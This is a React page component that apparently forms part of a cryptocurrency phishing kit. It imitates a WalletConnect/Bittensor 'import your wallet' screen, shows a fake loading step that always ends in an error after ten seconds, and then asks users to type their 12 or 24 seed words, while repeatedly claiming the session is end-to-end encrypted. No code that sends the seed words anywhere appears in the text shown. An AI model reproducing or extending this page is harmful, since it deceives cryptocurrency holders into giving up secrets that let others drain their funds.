import { useState, useEffect } from 'react';
import Conn from '/images/conn-img.png';
import Bitt from '/images/bittensor.jpg';
import Polkadot from '/images/polkadot.png';
import Nova from '/images/nova.jpeg';
import Metamask from '/images/metamask.png';
import Talisman from '/images/talisman.jpg';
import Ledger from '/images/ledger.jpg';
import BTCLI from '/images/logo.png';
import Wallet from '/images/wallet.png';
import Modal from '../components/common/Modal';
import Shield from '/images/shield.png';

const wallets = [
  {
    name: 'Bittensor',
    url: 'bittensor.com',
    logo: (
      <img
        src={Bitt}
        alt="Bittensor Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://bittensor.com',
  },
  {
    name: 'Polkadot Wallet',
    url: 'polkadot.com',
    logo: (
      <img
        src={Polkadot}
        alt="Polkadot Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://polkadot.com',
  },
  {
    name: 'Nova Wallet',
    url: 'novawallet.io',
    logo: (
      <img
        src={Nova}
        alt="Nova Wallet Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://novawallet.io',
  },
  {
    name: 'Metamask',
    url: 'metamask.io',
    logo: (
      <img
        src={Metamask}
        alt="Metamask Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://metamask.io',
  },
  {
    name: 'Talisman Wallet',
    url: 'talisman.xyz',
    logo: (
      <img
        src={Talisman}
        alt="Talisman Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://talisman.xyz',
  },
  {
    name: 'Ledger Wallet',
    url: 'ledger.com',
    logo: (
      <img
        src={Ledger}
        alt="Ledger Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://ledger.com',
  },
  {
    name: 'BTCLI Wallet',
    url: 'docs.bittensor.com',
    logo: (
      <img
        src={BTCLI}
        alt="BTCLI Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://docs.bittensor.com',
  },
  {
    name: 'Wallet Connect',
    url: 'walletconnect.com',
    logo: (
      <img
        src={Wallet}
        alt="Wallet Connect Logo"
        className="object-cover w-12 h-12 rounded-full"
      />
    ),
    link: 'https://walletconnect.com',
  },
];

export default function Staking() {
  const [modalOpen, setModalOpen] = useState(false);
  const [modalStep, setModalStep] = useState('loading'); // 'loading' | 'error' | 'manual'
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [mnemonic, setMnemonic] = useState('');

  // Handle modal step transitions
  useEffect(() => {
    let timer;
    if (modalOpen && modalStep === 'loading') {
      timer = setTimeout(() => {
        setModalStep('error');
      }, 10000); // 10 seconds
    }
    return () => clearTimeout(timer);
  }, [modalOpen, modalStep]);

  // Handle wallet click
  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setModalStep('loading');
    setModalOpen(true);
    setMnemonic('');
  };

  // Modal content logic
  const renderModalContent = () => {
    if (!selectedWallet) return null;
    if (modalStep === 'loading') {
      return (
        <div className="flex flex-col items-center">
          <div>
            <p className="mb-4 text-lg font-medium text-gray-700">
              This session is secured and encrypted
            </p>
          </div>
          <AnimatedLoaderBar />
          <div className="mt-2 text-center">
            <div className="text-xl font-semibold text-gray-800">
              starting secure connection...
            </div>
            <div className="text-xl font-semibold text-gray-500">
              please wait...
            </div>
          </div>
          <div className="flex items-center mt-8 text-gray-600">
            <div className="flex gap-4">
              <img src={Shield} alt="" className="w-8 h-8" />
              <p className="mb-4 text-lg font-medium text-gray-700">
                This session is protected with an end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      );
    }
    if (modalStep === 'error') {
      return (
        <div className="flex flex-col items-center">
          <div className="mb-4 text-lg font-medium text-gray-700">
            This session is secured and encrypted
          </div>
          <div className="w-full">
            <div className="px-4 py-1 mb-10 text-xs text-center text-[#ff0000] bg-white rounded border border-[#ff0000]">
              An error occurred... please try again or connect manually
            </div>
          </div>
          <button
            className="py-2 mb-3 w-full font-semibold text-blue-700 rounded-full border border-blue-600 transition hover:bg-blue-600 hover:text-white"
            onClick={() => setModalStep('loading')}
          >
            Try Again
          </button>
          <button
            className="py-2 w-full font-semibold text-white bg-blue-700 rounded-full transition hover:bg-opacity-90"
            onClick={() => setModalStep('manual')}
          >
            Connect Manually
          </button>
          <div className="flex items-center mt-8 text-gray-600">
            <div className="flex gap-4">
              <img src={Shield} alt="" className="w-8 h-8" />
              <p className="mb-4 text-lg font-medium text-gray-700">
                This session is protected with an end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      );
    }
    if (modalStep === 'manual') {
      return (
        <div className="flex flex-col items-center">
          <div className="mb-4 text-lg font-medium text-gray-700">
            This session is secured and encrypted
          </div>
          <textarea
            className="p-3 mb-4 w-full h-24 rounded border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
            placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
            value={mnemonic}
            onChange={(e) => setMnemonic(e.target.value)}
          />
          <button
            className="py-2 w-full font-semibold text-gray-500 bg-blue-200 rounded-lg cursor-not-allowed"
            disabled
          >
            Connect Wallet
          </button>
          <div className="flex items-center mt-8 text-gray-600">
            <div className="flex gap-4">
              <img src={Shield} alt="" className="w-8 h-8" />
              <p className="mb-4 text-lg font-medium text-gray-700">
                This session is protected with an end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      );
    }
    return null;
  };

  return (
    <div className="flex flex-col justify-center items-center px-2 sm:px-4 py-5 min-h-screen bg-white">
      {/* Top nav */}
      <div className="flex justify-between items-center px-2 sm:px-8 w-full">
        <span className="text-lg font-medium">Wallets</span>
        <span className="text-lg font-medium">dApps</span>
      </div>
      {/* Central diagram */}
      <div className="flex flex-col flex-1 justify-center items-center mt-8 sm:mt-12 mb-8 w-full">
        <div className="w-full flex justify-center">
          <img src={Conn} alt="" className="max-w-full h-auto" />
        </div>
        <div className="mt-8 text-center">
          <span className="font-semibold text-md">
            IMPORT YOUR WALLET ON BITTENSOR{' '}
          </span>
          <span className="inline-block ml-1 w-5 h-5 text-xs font-bold text-center text-white align-middle bg-black rounded-full">
            T
          </span>
        </div>
        {/* Animated bar with moving circle */}
        <AnimatedBar />
      </div>
      {/* Wallet grid */}
      <div className="mt-4 mb-8 w-full">
        <h2 className="px-1 mb-5 text-lg font-medium text-gray-400">
          Bittensor Wallet is a non-custodial wallet for the Bittensor network.
          With this release you can also use the Bittensor Wallet as an identity
          provider for web3 apps.
        </h2>
        <div className="grid grid-cols-1 gap-6 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4">
          {wallets.map((wallet) => (
            <div
              key={wallet.name}
              className="flex gap-4 items-center p-4 py-8 bg-white rounded-xl border border-gray-100 shadow cursor-pointer min-w-0"
              onClick={() => handleWalletClick(wallet)}
            >
              {wallet.logo}
              <div className="min-w-0">
                <div className="text-[20px] font-semibold text-gray-900 truncate">
                  {wallet.name}
                </div>
                <div className="text-base font-medium text-gray-500 truncate">
                  {wallet.url}
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
      {/* Footer */}
      <div className="mt-24 mb-2 text-sm text-center text-slate-900">
        WalletConnect © 2025. All Rights Reserved.
      </div>
      {/* Modal for wallet connection */}
      <Modal
        isOpen={modalOpen}
        onClose={() => setModalOpen(false)}
        logo={selectedWallet ? selectedWallet.logo : null}
      >
        {renderModalContent()}
      </Modal>
    </div>
  );
}

function AnimatedBar() {
  const [position, setPosition] = useState(0);
  useEffect(() => {
    const barWidth = window.innerWidth < 500 ? 100 : 120; // px
    const circleDiameter = 16; // px
    const maxPosition = barWidth - circleDiameter;
    let direction = 1;
    let pos = 0;
    const interval = setInterval(() => {
      pos += direction * 1;
      if (pos >= maxPosition) direction = -1;
      if (pos <= 0) direction = 1;
      setPosition(pos);
    }, 20);
    return () => clearInterval(interval);
  }, []);
  return (
    <div className="flex justify-center mt-4 w-full">
      <div
        className="relative w-full max-w-[120px] sm:max-w-[120px]"
        style={{ height: 4, background: '#000', borderRadius: 2 }}
      >
        <div
          className="absolute"
          style={{
            left: position,
            top: -6,
            width: 14,
            height: 14,
            background: '#e5e5e5',
            borderRadius: '50%',
            transition: 'left 0.02s linear',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
          }}
        />
      </div>
    </div>
  );
}
function AnimatedLoaderBar() {
  const [position, setPosition] = useState(0);
  useEffect(() => {
    const barWidth = window.innerWidth < 600 ? 200 : 450; // px
    const circleDiameter = 16; // px
    const maxPosition = barWidth - circleDiameter;
    let direction = 1;
    let pos = 0;
    const interval = setInterval(() => {
      pos += direction * 2;
      if (pos >= maxPosition) direction = -1;
      if (pos <= 0) direction = 1;
      setPosition(pos);
    }, 20);
    return () => clearInterval(interval);
  }, []);
  return (
    <div className="flex justify-center mt-4 w-full">
      <div
        className="relative w-full max-w-[200px] sm:max-w-[450px]"
        style={{ height: 3, background: '#000', borderRadius: 2 }}
      >
        <div
          className="absolute"
          style={{
            left: position,
            top: -6,
            width: 14,
            height: 14,
            background: '#e5e5e5',
            borderRadius: '50%',
            transition: 'left 0.02s linear',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
          }}
        />
      </div>
    </div>
  );
}
